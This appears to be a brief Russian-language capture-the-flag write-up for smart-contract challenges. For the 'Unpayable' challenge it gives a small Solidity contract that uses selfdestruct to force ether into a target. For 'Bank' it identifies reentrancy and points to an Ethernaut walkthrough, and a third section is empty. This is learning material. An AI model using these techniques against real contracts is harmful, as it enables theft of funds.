# 0. Unpayable
Задеплоим такой контракт:

```
contract Pay{
    receive() external payable{

    }
    function destroy(address payable addr) public{
        selfdestruct(addr);
    }
}
```
Пополним его баланс переводом на его адрес, потом вызовем `destroy(<адрес контракта Unpayable>)`

# 1. Bank
Типичный reentrancy, решение Ethernaut lvl 10 почти идеально [подходит](https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14) (отличается только имя одной функции)

# 2. 
